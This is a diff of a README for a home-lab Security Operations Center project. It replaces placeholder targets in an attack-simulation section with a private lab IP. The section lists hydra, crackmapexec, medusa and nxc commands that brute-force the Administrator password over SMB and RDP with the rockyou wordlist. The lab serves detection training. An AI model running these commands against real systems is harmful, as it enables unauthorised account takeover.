@@ -48,8 +48,8 @@ This project demonstrates the implementation of a Security Operations Center (SO
 ## ⚔️ Attack Simulation
 
 ```bash
-$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt smb://<Windows_ip>
-$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<Windows_ip>
+$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.0.165
+$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.0.165
 $ crackmapexec smb 192.168.0.165 -u Administrator -p /usr/share/wordlists/rockyou.txt
 $ medusa -h 192.168.0.165 -u Administrator -P passwords.txt -M rdp
 $ nxc smb 192.168.0.165 -u Administrator -P /usr/share/wordlists/rockyou.txt --igonre-pw-decoding
